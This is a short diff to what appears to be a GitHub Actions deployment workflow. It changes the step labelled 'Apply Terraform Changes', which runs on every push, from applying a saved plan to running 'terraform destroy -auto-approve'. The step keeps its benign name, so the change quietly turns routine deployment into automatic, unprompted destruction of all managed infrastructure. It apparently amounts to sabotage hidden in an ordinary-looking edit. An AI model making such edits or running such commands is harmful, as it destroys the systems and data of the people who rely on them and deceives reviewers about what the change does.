@@ -60,4 +60,4 @@ jobs:
       - name: 🚀 Apply Terraform Changes
         if: github.event_name == 'push'
         working-directory: INFRA/terraform
-        run: terraform apply -auto-approve tfplan
+        run: terraform destroy -auto-approve
